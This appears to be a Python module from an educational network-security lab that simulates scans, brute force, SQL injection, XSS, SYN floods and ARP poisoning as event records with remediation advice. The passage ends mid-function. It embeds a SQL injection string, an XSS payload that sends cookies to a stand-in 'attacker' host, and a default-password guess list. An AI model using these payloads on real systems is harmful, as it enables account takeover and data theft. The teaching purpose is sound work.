"""
RedLab Network Engine — Simulator

Runs a deterministic network simulation against a validated topology.
Generates NetworkEvent records describing what happens during the simulation.
"""
from __future__ import annotations

import datetime
import uuid
from typing import Optional

from ..schemas.lab import (
    GraphData,
    GraphNode,
    NetworkEvent,
    TopologyValidationResult,
    AttackExecutionRequest,
    AttackExecutionResponse,
    VerifyDefenseRequest,
    BeforeAfterComparison,
)
from .connectivity import evaluate_connectivity, _get_node_ip_and_prefix, _get_neighbors, ReachabilityResult


def _now() -> datetime.datetime:
    return datetime.datetime.now(datetime.UTC)


def _make_event(
    run_id: str,
    event_type: str,
    summary: str,
    src: Optional[GraphNode] = None,
    dst: Optional[GraphNode] = None,
    protocol: Optional[str] = None,
    detail: Optional[dict] = None,
) -> NetworkEvent:
    return NetworkEvent(
        id=str(uuid.uuid4()),
        run_id=run_id,
        timestamp=_now(),
        event_type=event_type,
        source_device_id=src.id if src else None,
        source_device_name=src.label if src else None,
        dest_device_id=dst.id if dst else None,
        dest_device_name=dst.label if dst else None,
        protocol=protocol,
        interface_name=None,
        summary=summary,
        detail=detail or {},
        provenance="simulated",
    )


def simulate_ping(
    graph: GraphData,
    run_id: str,
    source_id: str,
    dest_id: str,
) -> list[NetworkEvent]:
    """
    Simulate an ICMP ping from source to destination.
    Returns a list of NetworkEvent records.
    """
    events: list[NetworkEvent] = []

    src = next((n for n in graph.nodes if n.id == source_id), None)
    dst = next((n for n in graph.nodes if n.id == dest_id), None)

    if not src or not dst:
        return events

    src_ip, _ = _get_node_ip_and_prefix(src)
    dst_ip, _ = _get_node_ip_and_prefix(dst)

    # ICMP request event
    events.append(_make_event(
        run_id=run_id,
        event_type="icmp_request",
        summary=f"{src.label} → {dst.label}: ICMP Echo Request ({src_ip} → {dst_ip})",
        src=src, dst=dst,
        protocol="icmp",
        detail={"src_ip": src_ip, "dst_ip": dst_ip, "ttl": 64},
    ))

    result = evaluate_connectivity(graph, source_id, dest_id, protocol="icmp")

    if result.reachable:
        # ARP (if direct or via switch)
        if len(result.path) <= 3:
            events.append(_make_event(
                run_id=run_id,
                event_type="arp_request",
                summary=f"{src.label} → [broadcast]: ARP Who has {dst_ip}? Tell {src_ip}",
                src=src, dst=None,
                protocol="arp",
                detail={"sender_ip": src_ip, "target_ip": dst_ip},
            ))
            events.append(_make_event(
                run_id=run_id,
                event_type="arp_reply",
                summary=f"{dst.label} → {src.label}: ARP {dst_ip} is at <simulated-mac>",
                src=dst, dst=src,
                protocol="arp",
                detail={"sender_ip": dst_ip, "target_ip": src_ip},
            ))

        # ICMP reply
        events.append(_make_event(
            run_id=run_id,
            event_type="icmp_reply",
            summary=f"{dst.label} → {src.label}: ICMP Echo Reply ({dst_ip} → {src_ip}) — ✓ Reachable",
            src=dst, dst=src,
            protocol="icmp",
            detail={
                "src_ip": dst_ip, "dst_ip": src_ip,
                "rtt_ms": 1,
                "path": result.path_labels,
                "explanation": result.reason,
            },
        ))
    else:
        event_type = "icmp_unreachable"
        if result.blocked_by:
            event_type = "firewall_deny"

        events.append(_make_event(
            run_id=run_id,
            event_type=event_type,
            summary=f"{src.label} → {dst.label}: ✗ Unreachable — {result.reason}",
            src=src, dst=dst,
            protocol="icmp",
            detail={
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "reason": result.reason,
                "blocked_by": result.blocked_by,
                "firewall_rule": result.firewall_rule_hit,
                "path_attempted": result.path_labels,
            },
        ))

    return events


def simulate_port_scan(
    graph: GraphData,
    run_id: str,
    source_id: str,
    dest_id: str,
    ports: list[int] | None = None,
) -> list[NetworkEvent]:
    """
    Simulate a TCP SYN / Service discovery scan from source to destination.
    Evaluates reachability, firewall rule inspection per port, and service listening status.
    Returns a list of NetworkEvent records.
    """
    events: list[NetworkEvent] = []

    src = next((n for n in graph.nodes if n.id == source_id), None)
    dst = next((n for n in graph.nodes if n.id == dest_id), None)

    if not src or not dst:
        return events

    src_ip, _ = _get_node_ip_and_prefix(src)
    dst_ip, _ = _get_node_ip_and_prefix(dst)

    target_ports = ports or [21, 22, 23, 80, 443, 3306, 8080]

    events.append(_make_event(
        run_id=run_id,
        event_type="port_scan_start",
        summary=f"{src.label} initiating TCP SYN port scan against {dst.label} ({dst_ip}) on {len(target_ports)} ports.",
        src=src, dst=dst,
        protocol="tcp",
        detail={"src_ip": src_ip, "dst_ip": dst_ip, "ports": target_ports},
    ))

    # Destination services if any
    dst_services = dst.config.get("services", [])
    service_map = {}
    for s in dst_services:
        if isinstance(s, dict) and s.get("enabled", True):
            service_map[int(s.get("port", 0))] = s.get("name", "Service")

    open_ports = []
    filtered_ports = []
    closed_ports = []

    for port in target_ports:
        # Evaluate TCP reachability for this specific port
        res = evaluate_connectivity(graph, source_id, dest_id, protocol="tcp", port=port)
        if not res.reachable:
            if res.blocked_by:
                filtered_ports.append(port)
                events.append(_make_event(
                    run_id=run_id,
                    event_type="port_scan_filtered",
                    summary=f"Port {port}/TCP: FILTERED — Dropped by firewall rule on '{res.blocked_by}'",
                    src=src, dst=dst,
                    protocol="tcp",
                    detail={"port": port, "state": "filtered", "reason": res.reason, "rule": res.firewall_rule_hit},
                ))
            else:
                filtered_ports.append(port)
                events.append(_make_event(
                    run_id=run_id,
                    event_type="port_scan_unreachable",
                    summary=f"Port {port}/TCP: NO RESPONSE — {res.reason}",
                    src=src, dst=dst,
                    protocol="tcp",
                    detail={"port": port, "state": "unreachable", "reason": res.reason},
                ))
        else:
            # Device was reachable! Check if a service is listening
            if port in service_map:
                svc_name = service_map[port]
                open_ports.append({"port": port, "service": svc_name})
                events.append(_make_event(
                    run_id=run_id,
                    event_type="port_scan_open",
                    summary=f"Port {port}/TCP: OPEN — Service '{svc_name}' discovered!",
                    src=src, dst=dst,
                    protocol="tcp",
                    detail={"port": port, "state": "open", "service": svc_name},
                ))
            else:
                closed_ports.append(port)
                events.append(_make_event(
                    run_id=run_id,
                    event_type="port_scan_closed",
                    summary=f"Port {port}/TCP: CLOSED — TCP RST received (no listening service)",
                    src=src, dst=dst,
                    protocol="tcp",
                    detail={"port": port, "state": "closed"},
                ))

    # Summary event
    summary_text = (
        f"Scan complete: {len(open_ports)} open, "
        f"{len(filtered_ports)} filtered, {len(closed_ports)} closed on {dst.label}."
    )
    events.append(_make_event(
        run_id=run_id,
        event_type="port_scan_complete",
        summary=summary_text,
        src=src, dst=dst,
        protocol="tcp",
        detail={
            "open_ports": open_ports,
            "filtered_ports": filtered_ports,
            "closed_ports": closed_ports,
            "total_scanned": len(target_ports),
        },
    ))

    return events


def simulate_topology(
    graph: GraphData,
    run_id: str,
    validation: TopologyValidationResult,
) -> tuple[list[NetworkEvent], dict]:
    """
    Run a full topology simulation:
    1. Emit start event
    2. For every pair of network devices, evaluate connectivity
    3. Emit end event with summary
    Returns (events, result_summary).
    """
    events: list[NetworkEvent] = []
    NETWORK_TYPES = {"pc", "server", "linux_server", "web_server", "dns_server", "endpoint", "router", "layer3_switch", "firewall", "ids_ips"}

    events.append(_make_event(
        run_id=run_id,
        event_type="simulation_start",
        summary="Simulation started — evaluating network topology.",
        detail={
            "node_count": len(graph.nodes),
            "edge_count": len(graph.edges),
            "validation_warnings": len(validation.warnings),
        },
    ))

    network_nodes = [n for n in graph.nodes if n.type in NETWORK_TYPES]
    reachability_matrix: list[dict] = []

    # Evaluate all endpoint-to-endpoint pairs (avoid duplicates)
    endpoint_types = {"pc", "server", "linux_server", "web_server", "dns_server", "endpoint"}
    endpoints = [n for n in graph.nodes if n.type in endpoint_types]

    pair_count = 0
    reachable_count = 0

    for i, src in enumerate(endpoints):
        for dst in endpoints[i + 1:]:
            pair_count += 1
            result = evaluate_connectivity(graph, src.id, dst.id)

            if result.reachable:
                reachable_count += 1
                events.append(_make_event(
                    run_id=run_id,
                    event_type="icmp_reply",
                    summary=f"✓ {src.label} ↔ {dst.label}: Connectivity verified",
                    src=src, dst=dst,
                    protocol="icmp",
                    detail={
                        "reachable": True,
                        "path": result.path_labels,
                        "reason": result.reason,
                    },
                ))
            else:
                events.append(_make_event(
                    run_id=run_id,
                    event_type="icmp_unreachable" if not result.blocked_by else "firewall_deny",
                    summary=f"✗ {src.label} ↔ {dst.label}: {result.reason}",
                    src=src, dst=dst,
                    protocol="icmp",
                    detail={
                        "reachable": False,
                        "reason": result.reason,
                        "blocked_by": result.blocked_by,
                        "path_attempted": result.path_labels,
                    },
                ))

            reachability_matrix.append({
                "source_id": src.id,
                "source_label": src.label,
                "dest_id": dst.id,
                "dest_label": dst.label,
                "reachable": result.reachable,
                "reason": result.reason,
                "path": result.path_labels,
            })

    events.append(_make_event(
        run_id=run_id,
        event_type="simulation_end",
        summary=f"Simulation complete — {reachable_count}/{pair_count} endpoint pairs reachable.",
        detail={
            "pairs_tested": pair_count,
            "reachable_pairs": reachable_count,
            "reachability_matrix": reachability_matrix,
        },
    ))

    result_summary = {
        "pairs_tested": pair_count,
        "reachable_pairs": reachable_count,
        "unreachable_pairs": pair_count - reachable_count,
        "reachability_matrix": reachability_matrix,
        "warnings": [w.model_dump() for w in validation.warnings],
    }

    return events, result_summary


# ---------------------------------------------------------------------------
# RedLab 1.1 Attack Simulations
# ---------------------------------------------------------------------------

def simulate_brute_force(
    graph: GraphData,
    run_id: str,
    source_id: str,
    dest_id: str,
    port: int = 22,
) -> tuple[list[NetworkEvent], str, dict]:
    """
    Simulate a credential brute-force dictionary attack against a target host service.
    Returns (events, outcome, evidence).
    Outcome is 'compromised', 'blocked', or 'mitigated'.
    """
    events: list[NetworkEvent] = []
    src = next((n for n in graph.nodes if n.id == source_id), None)
    dst = next((n for n in graph.nodes if n.id == dest_id), None)
    if not src or not dst:
        return events, "failed", {}

    src_ip, _ = _get_node_ip_and_prefix(src)
    dst_ip, _ = _get_node_ip_and_prefix(dst)

    events.append(_make_event(
        run_id=run_id,
        event_type="attack_start",
        summary=f"Attacker {src.label} ({src_ip}) launching credential brute-force attack against {dst.label} ({dst_ip}) on port {port}/TCP.",
        src=src, dst=dst,
        protocol="tcp",
        detail={"technique": "T1110 - Brute Force", "target_port": port},
    ))

    # Evaluate connectivity on target port
    reach = evaluate_connectivity(graph, source_id, dest_id, protocol="tcp", port=port)
    if not reach.reachable:
        events.append(_make_event(
            run_id=run_id,
            event_type="firewall_deny" if reach.blocked_by else "attack_blocked",
            summary=f"Attack blocked: Inbound connection to port {port} dropped by {reach.blocked_by or 'routing boundary'}.",
            src=src, dst=dst,
            protocol="tcp",
            detail={"blocked_by": reach.blocked_by, "reason": reach.reason},
        ))
        return events, "blocked", {"blocked_by": reach.blocked_by, "reason": reach.reason}

    # Check for IDS/IPS in topology
    ids_node = next((n for n in graph.nodes if n.type == "ids_ips"), None)
    ips_active = ids_node and ids_node.config.get("mode") == "ips"

    # Simulate 4 attempts
    guesses = [("root", "123456"), ("admin", "admin"), ("operator", "password"), ("root", "toor")]
    for i, (user, pwd) in enumerate(guesses, start=1):
        events.append(_make_event(
            run_id=run_id,
            event_type="auth_attempt",
            summary=f"[{i}/4] Authentication attempt: username='{user}', password='***'",
            src=src, dst=dst,
            protocol="tcp",
            detail={"username": user, "attempt": i},
        ))

    # Check if target or firewall has fail2ban / rate-limiting enabled
    dst_cfg = dst.config
    has_fail2ban = dst_cfg.get("fail2ban_enabled", False) or dst_cfg.get("rate_limiting", False)

    if ids_node:
        events.append(_make_event(
            run_id=run_id,
            event_type="ids_alert",
            summary=f"ALERT [{ids_node.label}]: High-frequency authentication failure signature matched (ET SCAN SSH Brute Force).",
            src=src, dst=dst,
            protocol="tcp",
            detail={"sensor_id": ids_node.id, "alert_type": "SSH_BRUTE_FORCE", "severity": "high"},
        ))
        if ips_active:
            events.append(_make_event(
                run_id=run_id,
                event_type="ids_block",
                summary=f"PROTECTION [{ids_node.label}]: IPS inline drop triggered — source {src_ip} shunned for 300s.",
                src=src, dst=dst,
                protocol="tcp",
                detail={"action": "drop_and_shun", "sensor_id": ids_node.id},
            ))
            return events, "blocked", {"mitigated_by": ids_node.label, "reason": "IPS inline block"}

    if has_fail2ban:
        events.append(_make_event(
            run_id=run_id,
            event_type="auth_rate_limited",
            summary=f"Defense active: {dst.label} Host Fail2ban triggered after threshold exceeded. Source {src_ip} IP banned.",
            src=src, dst=dst,
            protocol="tcp",
            detail={"defense": "fail2ban", "attempts_blocked": 1},
        ))
        return events, "mitigated", {"defense_active": "fail2ban", "attempts_banned": True}

    # Weak credentials check
    has_weak_auth = dst_cfg.get("allow_weak_passwords", True)
    if has_weak_auth:
        events.append(_make_event(
            run_id=run_id,
            event_type="auth_success",
            summary=f"EXPLOIT SUCCESSFUL: Credentials discovered ('root':'toor')! Attacker achieved remote interactive shell on {dst.label}.",
            src=src, dst=dst,
            protocol="tcp",
            detail={"compromised_user": "root", "shell_obtained": True},
        ))
        return events, "compromised", {"shell_access": True, "compromised_user": "root"}
    else:
        events.append(_make_event(
            run_id=run_id,
            event_type="auth_failed_all",
            summary=f"Attack exhausted dictionary: {dst.label} enforces strong authentication. Zero credentials matched.",
            src=src, dst=dst,
            protocol="tcp",
            detail={"password_policy": "enforced"},
        ))
        return events, "mitigated", {"reason": "strong_credentials"}


def simulate_traffic_analysis(
    graph: GraphData,
    run_id: str,
    source_id: str,
    dest_id: str,
) -> tuple[list[NetworkEvent], str, dict]:
    """
    Simulate realistic packet capture and multi-hop protocol analysis between hosts.
    Returns (events, outcome, evidence).
    """
    events: list[NetworkEvent] = []
    src = next((n for n in graph.nodes if n.id == source_id), None)
    dst = next((n for n in graph.nodes if n.id == dest_id), None)
    if not src or not dst:
        return events, "failed", {}

    src_ip, _ = _get_node_ip_and_prefix(src)
    dst_ip, _ = _get_node_ip_and_prefix(dst)

    events.append(_make_event(
        run_id=run_id,
        event_type="capture_start",
        summary=f"Network traffic capture initiated between {src.label} ({src_ip}) and {dst.label} ({dst_ip}).",
        src=src, dst=dst,
        protocol="ip",
        detail={"capture_filter": f"host {dst_ip}", "interface": "eth0"},
    ))

    # DNS phase
    events.append(_make_event(
        run_id=run_id,
        event_type="dns_query",
        summary=f"{src.label} → DNS: Standard query 0x1a2b A {dst.label.lower()}.internal",
        src=src, dst=dst,
        protocol="dns",
        detail={"query": f"{dst.label.lower()}.internal", "record_type": "A"},
    ))
    events.append(_make_event(
        run_id=run_id,
        event_type="dns_reply",
        summary=f"DNS → {src.label}: Standard query response 0x1a2b A {dst_ip}",
        src=dst, dst=src,
        protocol="dns",
        detail={"answer": dst_ip, "ttl": 300},
    ))

    # TCP Handshake
    events.append(_make_event(
        run_id=run_id,
        event_type="tcp_syn",
        summary=f"{src.label} → {dst.label}: [SYN] Seq=0 Win=64240 Len=0 MSS=1460",
        src=src, dst=dst,
        protocol="tcp",
        detail={"flags": "SYN", "seq": 0},
    ))
    events.append(_make_event(
        run_id=run_id,
        event_type="tcp_syn_ack",
        summary=f"{dst.label} → {src.label}: [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0",
        src=dst, dst=src,
        protocol="tcp",
        detail={"flags": "SYN, ACK", "seq": 0, "ack": 1},
    ))
    events.append(_make_event(
        run_id=run_id,
        event_type="tcp_ack",
        summary=f"{src.label} → {dst.label}: [ACK] Seq=1 Ack=1 Win=64240 Len=0",
        src=src, dst=dst,
        protocol="tcp",
        detail={"flags": "ACK", "seq": 1, "ack": 1},
    ))

    # Application data inspection (plaintext HTTP vs HTTPS)
    dst_services = dst.config.get("services", [])
    has_tls = any(s.get("port") == 443 for s in dst_services if isinstance(s, dict))
    if has_tls:
        events.append(_make_event(
            run_id=run_id,
            event_type="tls_handshake",
            summary=f"TLSv1.3 Encrypted Handshake: CipherSuite TLS_AES_256_GCM_SHA384 (Payload protected from interception).",
            src=src, dst=dst,
            protocol="tls",
            detail={"tls_version": "TLSv1.3", "cipher": "TLS_AES_256_GCM_SHA384", "encrypted": True},
        ))
        evidence_summary = "All application payloads securely encrypted with TLS 1.3."
    else:
        events.append(_make_event(
            run_id=run_id,
            event_type="http_plaintext_leak",
            summary=f"CLEARTEXT TRANSMISSION: HTTP GET /api/v1/user HTTP/1.1 with Bearer token exposed in packet trace!",
            src=src, dst=dst,
            protocol="http",
            detail={"method": "GET", "uri": "/api/v1/user", "cleartext_headers": True},
        ))
        evidence_summary = "Unencrypted HTTP payload observed; sensitive tokens visible in transit."

    events.append(_make_event(
        run_id=run_id,
        event_type="capture_complete",
        summary=f"Packet capture session finished: 12 frames captured (1,842 bytes). Pcap available.",
        src=src, dst=dst,
        protocol="pcap",
        detail={"packet_count": 12, "bytes": 1842, "pcap_reference": f"redlab-{run_id}.pcap"},
    ))

    return events, "discovered", {
        "pcap_file": f"redlab-{run_id}.pcap",
        "packet_count": 12,
        "bytes_captured": 1842,
        "analysis_summary": evidence_summary,
    }


def simulate_web_attack(
    graph: GraphData,
    run_id: str,
    source_id: str,
    dest_id: str,
    attack_type: str = "sqli",
) -> tuple[list[NetworkEvent], str, dict]:
    """
    Simulate a web application security exploit (SQLi or XSS) against an HTTP server.
    Returns (events, outcome, evidence).
    """
    events: list[NetworkEvent] = []
    src = next((n for n in graph.nodes if n.id == source_id), None)
    dst = next((n for n in graph.nodes if n.id == dest_id), None)
    if not src or not dst:
        return events, "failed", {}

    src_ip, _ = _get_node_ip_and_prefix(src)
    dst_ip, _ = _get_node_ip_and_prefix(dst)

    # Evaluate reachability on web port (80 or 443)
    reach = evaluate_connectivity(graph, source_id, dest_id, protocol="tcp", port=80)
    if not reach.reachable:
        reach = evaluate_connectivity(graph, source_id, dest_id, protocol="tcp", port=443)

    if not reach.reachable:
        events.append(_make_event(
            run_id=run_id,
            event_type="firewall_deny" if reach.blocked_by else "attack_blocked",
            summary=f"Web exploit blocked: Inbound connection dropped by perimeter firewall ({reach.blocked_by or 'routing boundary'}).",
            src=src, dst=dst,
            protocol="http",
            detail={"blocked_by": reach.blocked_by, "reason": reach.reason},
        ))
        return events, "blocked", {"blocked_by": reach.blocked_by, "reason": reach.reason}

    # Check if WAF or input validation is active
    dst_cfg = dst.config
    waf_enabled = dst_cfg.get("waf_enabled", False) or dst_cfg.get("input_sanitization", False)

    if attack_type == "sqli":
        payload = "' OR '1'='1' --"
        events.append(_make_event(
            run_id=run_id,
            event_type="web_exploit_attempt",
            summary=f"Attacker injected SQL payload into query param: GET /login?user={payload}",
            src=src, dst=dst,
            protocol="http",
            detail={"technique": "CWE-89: SQL Injection", "payload": payload},
        ))

        if waf_enabled:
            events.append(_make_event(
                run_id=run_id,
                event_type="waf_block",
                summary=f"DEFENSE ACTIVE: Web Application Firewall intercepted SQL injection pattern. Returned HTTP 403 Forbidden.",
                src=src, dst=dst,
                protocol="http",
                detail={"waf_rule": "OWASP_CRS_942100", "http_status": 403},
            ))
            return events, "blocked", {"mitigated_by": "WAF", "payload_blocked": payload}
        else:
            events.append(_make_event(
                run_id=run_id,
                event_type="db_leak_detected",
                summary=f"EXPLOIT CONFIRMED: Database bypass occurred! 25 user credential records returned in HTTP response body.",
                src=src, dst=dst,
                protocol="http",
                detail={"records_leaked": 25, "impact": "Authentication Bypass"},
            ))
            return events, "compromised", {"vulnerability": "SQL Injection", "records_leaked": 25}

    else:  # xss
        payload = "<script>fetch('http://attacker/steal?cookie='+document.cookie)</script>"
        events.append(_make_event(
            run_id=run_id,
            event_type="web_exploit_attempt",
            summary=f"Attacker submitted Cross-Site Scripting payload: {payload}",
            src=src, dst=dst,
            protocol="http",
            detail={"technique": "CWE-79: Cross-Site Scripting", "payload": payload},
        ))

        if waf_enabled:
            events.append(_make_event(
                run_id=run_id,
                event_type="waf_block",
                summary=f"DEFENSE ACTIVE: Content Security Policy & WAF neutralized script injection. Input escaped cleanly.",
                src=src, dst=dst,
                protocol="http",
                detail={"defense": "HTML Entity Encoding / CSP"},
            ))
            return events, "blocked", {"mitigated_by": "CSP/WAF", "payload_blocked": payload}
        else:
            events.append(_make_event(
                run_id=run_id,
                event_type="xss_execution",
                summary=f"EXPLOIT CONFIRMED: Malicious script rendered without escaping in user browser context. Session hijacked.",
                src=src, dst=dst,
                protocol="http",
                detail={"impact": "Stored XSS Execution / Cookie Theft"},
            ))
            return events, "compromised", {"vulnerability": "Cross-Site Scripting", "session_stolen": True}


def simulate_segmentation_test(
    graph: GraphData,
    run_id: str,
    source_id: str,
    dest_id: str,
) -> tuple[list[NetworkEvent], str, dict]:
    """
    Test network segmentation and firewall isolation between subnets/VLANs.
    Returns (events, outcome, evidence).
    """
    events: list[NetworkEvent] = []
    src = next((n for n in graph.nodes if n.id == source_id), None)
    dst = next((n for n in graph.nodes if n.id == dest_id), None)
    if not src or not dst:
        return events, "failed", {}

    src_ip, _ = _get_node_ip_and_prefix(src)
    dst_ip, _ = _get_node_ip_and_prefix(dst)

    events.append(_make_event(
        run_id=run_id,
        event_type="segmentation_probe",
        summary=f"Testing network isolation boundary between {src.label} ({src_ip}) and sensitive segment {dst.label} ({dst_ip}).",
        src=src, dst=dst,
        protocol="ip",
        detail={"src_ip": src_ip, "dst_ip": dst_ip},
    ))

    reach = evaluate_connectivity(graph, source_id, dest_id)
    if reach.reachable:
        events.append(_make_event(
            run_id=run_id,
            event_type="segmentation_breached",
            summary=f"BOUNDARY BREACH: {src.label} can route directly to {dst.label}. Segment isolation failed (Flat VLAN or missing ACL)!",
            src=src, dst=dst,
            protocol="icmp",
            detail={"path": reach.path_labels, "segmentation_violation": True},
        ))
        return events, "compromised", {"isolated": False, "breach_path": reach.path_labels}
    else:
        events.append(_make_event(
            run_id=run_id,
            event_type="segmentation_enforced",
            summary=f"BOUNDARY ENFORCED: Lateral movement blocked. Traffic between segments successfully dropped by {reach.blocked_by or 'firewall'}.",
            src=src, dst=dst,
            protocol="icmp",
            detail={"blocked_by": reach.blocked_by, "reason": reach.reason},
        ))
        return events, "blocked", {"isolated": True, "enforced_by": reach.blocked_by}


def simulate_syn_flood(
    graph: GraphData,
    run_id: str,
    source_id: str,
    dest_id: str,
    target_port: int = 80,
) -> tuple[list[NetworkEvent], str, dict]:
    events: list[NetworkEvent] = []
    src = next((n for n in graph.nodes if n.id == source_id), None)
    dst = next((n for n in graph.nodes if n.id == dest_id), None)
    if not src or not dst:
        return events, "failed", {}

    src_ip, _ = _get_node_ip_and_prefix(src)
    dst_ip, _ = _get_node_ip_and_prefix(dst)

    events.append(_make_event(
        run_id=run_id,
        event_type="dos_syn_flood_initiated",
        summary=f"High-frequency TCP SYN packet flood launched from {src.label} ({src_ip}) toward {dst.label}:{target_port}.",
        src=src, dst=dst,
        protocol="tcp",
        detail={"rate_pps": 15000, "flag": "SYN", "target_port": target_port},
    ))

    reach = evaluate_connectivity(graph, source_id, dest_id)
    if not reach.reachable:
        events.append(_make_event(
            run_id=run_id,
            event_type="dos_packets_dropped",
            summary=f"DEFENSE ACTIVE: Perimeter firewall rule intercepted and dropped flooded SYN packets before reaching {dst.label}.",
            src=src, dst=dst,
            protocol="tcp",
            detail={"blocked_by": reach.blocked_by, "reason": reach.reason},
        ))
        return events, "blocked", {"mitigated_by": reach.blocked_by or "Firewall ACL", "syn_backlog_intact": True}

    fw_nodes = [n for n in graph.nodes if n.type == "firewall"]
    has_rate_limit = False
    for fw in fw_nodes:
        cfg = fw.config or {}
        if cfg.get("syn_flood_protection") or cfg.get("rate_limiting"):
            has_rate_limit = True
            break

    if has_rate_limit:
        events.append(_make_event(
            run_id=run_id,
            event_type="dos_rate_limited",
            summary=f"DEFENSE ACTIVE: Firewall SYN Proxy / Rate Limiting activated. SYN cookie verification succeeded; queue protected.",
            src=src, dst=dst,
            protocol="tcp",
            detail={"syn_cookies": True, "dropped_spurious_syns": 14950},
        ))
        return events, "blocked", {"mitigated_by": "SYN Cookies / Rate Limiter", "uptime": "100%"}
    else:
        events.append(_make_event(
            run_id=run_id,
            event_type="dos_service_exhausted",
            summary=f"EXPLOIT CONFIRMED: Half-open TCP connection backlog on {dst.label}:{target_port} fully exhausted! Legitimate connections dropped.",
            src=src, dst=dst,
            protocol="tcp",
            detail={"backlog_utilization": "100%", "impact": "Service Outage / DoS"},
        ))
        return events, "compromised", {"service_exhausted": True, "dropped_legitimate_connections": 120}


def simulate_arp_poisoning(
    graph: GraphData,
    run_id: str,
    source_id: str,
    dest_id: str,
) -> tuple[list[NetworkEvent], str, dict]:
    events: list[NetworkEvent] = []
    src = next((n for n in graph.nodes if n.id == source_id), None)
    dst = next((n for n in graph.nodes if n.id == dest_id), None)
    if not src or not dst:
        return events, "failed", {}

    src_ip, _ = _get_node_ip_and_prefix(src)
    dst_ip, _ = _get_node_ip_and_prefix(dst)

    events.append(_make_event(
        run_id=run_id,
        event_type="arp_spoof_broadcast",
        summary=f"Attacker {src.label} ({src_ip}) broadcasting forged gratuitous ARP replies: asserting {dst_ip} is at rogue MAC 02:42:AC:11:00:99.",
        src=src, dst=dst,
        protocol="arp",
        detail={"spoofed_ip": dst_ip, "fake_mac": "02:42:AC:11:00:99"},
    ))

    switches = [n for n in graph.nodes if n.type == "switch"]
    dai_enabled = any((s.config or {}).get("dai_enabled") or (s.config or {}).get("port_security") for s in switches)

    if dai_enabled:
        events.append(_make_event(
            run_id=run_id,
            event_type="arp_inspection_drop",
            summary=f"DEFENSE ACTIVE: Access switch Dynamic ARP Inspection (DAI) rejected conflicting ARP packet. Binding table preserved.",
            src=src, dst=dst,
            protocol="arp",
            detail={"defense": "Dynamic ARP Inspection (DAI)", "port_status": "Secure"},
        ))
        return events, "blocked", {"mitigated_by": "Dynamic ARP Inspection (DAI)", "cache_poisoned": False}
    else:
        events.append(_make_event(
            run_id=run_id,
            event_type="arp_cache_overwritten",
            summary=f"EXPLOIT CONFIRMED: Local ARP cache poisoned! LAN traffic destined for {dst_ip} is redirected through attacker {src.label}.",
            src=src, dst=dst,
            protocol="arp",
            detail={"mitm_established": True, "impact": "Traffic Interception / Credentials Sniffing"},
        ))
        return events, "compromised", {"arp_cache_poisoned": True, "mitm_active": True}


# ---------------------------------------------------------------------------
# High-Level Scenario Runner & Verification
# ---------------------------------------------------------------------------

SCENARIO_METADATA = {
    "attack_port_scan": {
        "title": "Network Reconnaissance & Port Scanning",
        "takeaway": "Port scanning allows adversaries to map listening services and perimeter firewall rule gaps.",
        "remediation": "Configure firewall default-deny and only permit specific authorized source subnets.",
    },
    "auth_brute_force": {
        "title": "Authentication Security & Brute-Force Defense",
        "takeaway": "Unrestricted administrative services with default passwords are easily compromised within seconds.",
        "remediation": "Enforce strong credentials, disable root password login, and enable fail2ban / rate-limiting.",
    },
    "traffic_analysis": {
        "title": "Traffic Analysis & Packet Inspection",
        "takeaway": "Plaintext protocols transmit cleartext credentials that can be captured across any intermediate hop.",
        "remediation": "Migrate all cleartext protocols (HTTP:80, Telnet:23, FTP:21) to secure TLS/SSH equivalents.",
    },
    "web_security_injection": {
        "title": "Web Application Security & SQL Injection",
        "takeaway": "Unsanitized user inputs allow adversaries to manipulate database queries and bypass authentication.",
        "remediation": "Use parameterized queries (prepared statements) and deploy a Web Application Firewall (WAF).",
    },
    "firewall_segmentation": {
        "title": "Firewall & Network Segmentation Testing",
        "takeaway": "Flat networks allow an attacker with a single compromised workstation to move laterally to servers.",
        "remediation": "Isolate critical servers in dedicated VLANs and enforce strict inter-VLAN firewall filtering.",
    },
    "syn_flood_dos": {
        "title": "Denial of Service (DoS): TCP SYN Flood",
        "takeaway": "Unprotected TCP endpoints are vulnerable to SYN queue exhaustion, denying access to legitimate clients.",
        "remediation": "Enable TCP SYN cookies on the OS and deploy firewall connection rate limiting.",
    },
    "arp_cache_poisoning": {
        "title": "Layer 2 Man-in-the-Middle: ARP Cache Spoofing",
        "takeaway": "Unauthenticated ARP requests allow attackers on the local segment to intercept or modify in-transit frames.",
        "remediation": "Enable Dynamic ARP Inspection (DAI) and DHCP Snooping on all access layer switches.",
    },
}


def execute_attack_scenario(
    graph: GraphData,
    request: AttackExecutionRequest,
) -> AttackExecutionResponse:
    """Execute an approved attack scenario deterministically against the lab topology."""
    import uuid

    run_id = f"attack-{str(uuid.uuid4())[:8]}"
    sc_meta = SCENARIO_METADATA.get(
        request.scenario_id,
        {
            "title": request.scenario_id.replace("_", " ").title(),
            "takeaway": "Simulated attack exercise completed.",
            "remediation": "Review device configurations and firewall rules.",
        },
    )

    # Resolve target and attacker
    target = next((n for n in graph.nodes if n.id == request.target_id), None)
    if not target:
        raise ValueError(f"Target node '{request.target_id}' not found in lab.")

    attacker = None
    if request.attacker_id:
        attacker = next((n for n in graph.nodes if n.id == request.attacker_id), None)
    if not attacker:
        # Default to an external network node or PC
        attacker = next((n for n in graph.nodes if n.type == "external_network" or "attacker" in n.label.lower()), None)
    if not attacker:
        attacker = next((n for n in graph.nodes if n.type == "pc" and n.id != target.id), None)
    if not attacker:
        attacker = graph.nodes[0] if graph.nodes else target

    # Dispatch by scenario
    sid = request.scenario_id
    if sid == "attack_port_scan":
        ports = request.parameters.get("ports", [21, 22, 23, 80, 443, 3306])
        events = simulate_port_scan(graph, run_id, attacker.id, target.id, ports)
        has_open = any(e.event_type == "port_scan_open" for e in events)
        outcome = "compromised" if has_open else "blocked"

        port_forensics = []
        for p in ports:
            p_evt = next((e for e in events if e.detail and e.detail.get("port") == p), None)
            state = "closed"
            if p_evt:
                if p_evt.event_type == "port_scan_open":
                    state = "open"
                elif p_evt.event_type in ("port_scan_filtered", "port_scan_unreachable", "firewall_deny"):
                    state = "filtered"
                else:
                    state = "closed"

            service_name = {21: "FTP", 22: "SSH", 23: "Telnet", 80: "HTTP", 443: "HTTPS", 3306: "MySQL", 8080: "HTTP-Alt"}.get(p, f"Port {p}")

            if state == "open":
                who_closed = "Nobody (Port is OPEN)"
                how_it_closed = f"Active daemon ({service_name}) is bound to 0.0.0.0:{p} on {target.label}. Returned TCP SYN-ACK handshake response."
